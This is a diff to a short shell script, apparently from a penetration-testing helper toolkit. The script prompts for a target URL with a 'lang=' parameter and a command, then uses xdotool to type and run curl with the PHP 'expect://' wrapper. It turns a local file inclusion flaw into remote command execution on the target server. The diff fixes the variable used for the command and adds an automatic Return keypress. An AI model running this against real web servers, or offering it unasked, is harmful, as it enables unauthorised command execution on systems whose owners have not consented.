@@ -4,13 +4,15 @@
 Check if we can execute expect to execute commands
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+# Generate GUI form items (label, type (optional: default text), name, default (optional))
+WEBSITE_FIELD=$(form_item "website" "website" "http://domain.com/?lang=")
+CMD_FIELD=$(form_item "CMD" "cmd" "whoami")
 
-# Generate gui form
-generate_form "Website" "Cmd"
+# Generate GUI form
+generate_form "${WEBSITE_FIELD}" "${CMD_FIELD}"
 
-WEBSITE=${form_data["Website"]}
-CMD=${form_data["Cmd"]}
+WEBSITE=${form_data["website"]}
+CMD=${form_data["cmd"]}
 
-paste_command "curl -ks '${WEBSITE}expect://${FILE}'"
+paste_command "curl -ks '${WEBSITE}expect://${CMD}'"
+xdotool key Return
